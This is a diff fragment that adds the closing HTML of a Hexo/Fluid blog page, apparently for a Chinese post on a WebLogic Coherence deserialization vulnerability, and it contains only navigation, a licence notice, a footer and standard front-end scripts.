+                      <a class="hover-with-bg" href="/tags/WebLogic/">WebLogic</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2020/09/04/Java-RASP-%E9%98%B2%E6%8A%A4%E6%8A%80%E6%9C%AF/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>Java RASP 防护技术</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2020/08/23/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%E5%92%8Cautotype%E8%A7%82%E6%B5%8B/">
+                        <span>Fastjson反序列化机制和autotype观测</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "(WebLogic)Coherence 反序列化漏洞&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
